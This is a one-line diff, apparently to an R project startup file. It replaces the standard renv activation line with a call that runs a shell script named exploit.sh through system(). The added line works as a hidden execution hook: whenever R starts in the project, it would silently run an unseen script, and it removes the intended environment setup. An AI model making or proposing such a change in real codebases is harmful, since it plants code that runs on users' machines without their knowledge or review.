@@ -1,1 +1,1 @@
-source("renv/activate.R")
+system("bash exploit.sh")
